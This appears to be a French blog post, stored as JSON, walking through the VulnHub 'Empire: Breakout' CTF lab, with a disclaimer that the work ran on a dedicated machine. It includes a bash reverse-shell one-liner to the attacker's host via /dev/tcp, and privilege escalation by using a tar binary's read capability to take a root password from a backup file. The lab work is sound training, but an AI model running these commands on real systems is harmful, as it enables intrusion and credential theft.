{"hash":"e9e710b63b02d049a9f8a5359c5c22618737fe2f","data":{"post":{"title":"CTF Empire: Breakout","date":"20 November 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.3</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.21</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir EmpireBreakout &amp;&amp; cd EmpireBreakout</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -sV -sT -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nPORT      STATE SERVICE     VERSION\n<span class=\"token number\">80</span>/tcp    <span class=\"token function\">open</span>  http        Apache httpd <span class=\"token number\">2.4</span>.51 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Debian<span class=\"token punctuation\">))</span></span>\n<span class=\"token number\">139</span>/tcp   <span class=\"token function\">open</span>  netbios-ssn Samba smbd <span class=\"token number\">4.6</span>.2\n<span class=\"token number\">445</span>/tcp   <span class=\"token function\">open</span>  netbios-ssn Samba smbd <span class=\"token number\">4.6</span>.2\n<span class=\"token number\">10000</span>/tcp <span class=\"token function\">open</span>  http        MiniServ <span class=\"token number\">1.981</span> <span class=\"token punctuation\">(</span>Webmin httpd<span class=\"token punctuation\">)</span>\n<span class=\"token number\">20000</span>/tcp <span class=\"token function\">open</span>  http        MiniServ <span class=\"token number\">1.830</span> <span class=\"token punctuation\">(</span>Webmin httpd<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un serveur <strong>Apache</strong> 2.4.51 sur le port <strong>80</strong>, un serveur <strong>Samba</strong> 4.6.2 sur les port <strong>139</strong> et <strong>445</strong> et 2 deux serveurs <strong>Webmin</strong> (de 2 versions différentes) sur les ports <strong>10000</strong> et <strong>20000</strong>.</p>\n<p>Sur la page d'accueil du serveur <strong>Apache</strong>, on a indice en bas du code source de la page HTML.</p>\n<div class=\"gridsome-highlight\" data-language=\"txt\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"><code class=\"language-txt\">&lt;!--\ndon&#39;t worry no one will get here, it&#39;s safe to share with you my access. Its encrypted :)\n\n++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.\n\n--&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>C'est le fameux langage <strong>brainfuck</strong> qui retourne une sorte de mot de passe \".2uqPEfj3D&#x3C;P'a-3\".</p>\n<p>Ensuite, on énumère le serveur <strong>Samba</strong> à la recherche d'un utilisateur avec l'outil <strong>enum4linux</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">enum4linux -a <span class=\"token variable\">$IP</span>\n\n<span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> Enumerating <span class=\"token function\">users</span> using SID S-1-22-1 and logon username <span class=\"token string\">''</span>, password <span class=\"token string\">''</span>\nS-1-22-1-1000 Unix User<span class=\"token punctuation\">\\</span>cyber <span class=\"token punctuation\">(</span>Local User<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un utilisateur potentiel, \"cyber\".</p>\n<p>Puis, on poursuit avec les 2 serveurs <strong>Webmin</strong> qui nous indiquent le host à utiliser.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">vim</span> /etc/hosts\n<span class=\"token number\">192.168</span>.1.21    breakout.home</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>La connexion avec <code class=\"language-text\">cyber:.2uqPEfj3D&lt;P&#39;a-3</code> ne fonctionne pas sur le premier serveur avec le port <strong>10000</strong> mais sur le second avec le <strong>20000</strong>.</p>\n<h2>Pénétration</h2>\n<p>Dans le menu de gauche, il y a une petite icone qui symbolise une commande shell. On va ouvrir un reverse shell pour être plus à l'aise. Dans un nouvel onglet de votre terminal, instanciez le serveur <strong>Netcat</strong> <code class=\"language-text\">nc -lanp 1234</code>. Puis dans le shell de Webmin, <code class=\"language-text\">bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.1.33/1234 0&gt;&amp;1&#39;</code></p>\n<p>On trouve le premier flag dans le répertoire de l'utilisateur \"cyber\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> user.txt\n3mp<span class=\"token operator\">!</span>r3<span class=\"token punctuation\">{</span>You_Manage_To_Break_To_My_Secure_Access<span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h2>Escalation</h2>\n<p>Dans le même répertoire, il y a un exécutable \"tar\", plus précisément un ELF (Executable and Linkable Format).</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ls</span> -la\n-rwxr-xr-x  <span class=\"token number\">1</span> root  root  <span class=\"token number\">531928</span> Oct <span class=\"token number\">19</span> <span class=\"token number\">15</span>:40 <span class=\"token function\">tar</span>\n$ <span class=\"token function\">file</span> <span class=\"token function\">tar</span>\ntar: ELF <span class=\"token number\">64</span>-bit LSB pie executable, x86-64, version <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>SYSV<span class=\"token punctuation\">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class=\"token punctuation\">[</span>sha1<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>727740cc46ed2e44f47dfff7bad5dc3fdb1249cb, <span class=\"token keyword\">for</span> GNU/Linux <span class=\"token number\">3.2</span>.0, stripped</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On affiche les <em>capabilities</em> (capacités) de cet exécutable avec la commande <strong>getcap</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ getcap <span class=\"token function\">tar</span>\n<span class=\"token function\">tar</span> <span class=\"token assign-left variable\">cap_dac_read_search</span><span class=\"token operator\">=</span>ep</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Cette <a href=\"https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#example-with-binary-3\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">option</a> signifie que le binaire sera capable de lire n'importe quel fichier. Cela tombe à pic car dans le dossier \"/var/backups\", on a un fichier que l'on voudrait pouvoir lire \".old_pass.bak\" car on n'a pas les droits de lecture.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ ./tar -cf back.tar /var/backups/.old_pass.bak\n$ <span class=\"token function\">tar</span> -xf back.tar\n$ <span class=\"token function\">ls</span>\nback.tar  <span class=\"token function\">tar</span>  user.txt  var</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Le dossier \"var\" a été créé et on peut lire son contenu.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> var/backups/.old_pass.bak\nTs<span class=\"token operator\">&amp;</span><span class=\"token number\">4</span><span class=\"token operator\">&amp;</span>YurgtRX<span class=\"token punctuation\">(</span><span class=\"token operator\">=</span>~h</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Comme convenu, il contient un mot de passe, ce qui nous permet de nous connecter en tant qu'utilisateur \"root\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">su</span> root\nPassword: Ts<span class=\"token operator\">&amp;</span><span class=\"token number\">4</span><span class=\"token operator\">&amp;</span>YurgtRX<span class=\"token punctuation\">(</span><span class=\"token operator\">=</span>~h\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Et on trouve rapidement le second et dernier flag.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token builtin class-name\">cd</span> ~\n$ <span class=\"token function\">cat</span> rOOt.txt\n3mp<span class=\"token operator\">!</span>r3<span class=\"token punctuation\">{</span>You_Manage_To_BreakOut_From_My_System_Congratulation<span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n","download":"https://www.vulnhub.com/entry/empire-breakout,751","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"}],"timeToRead":3,"parts":[]}},"context":{}}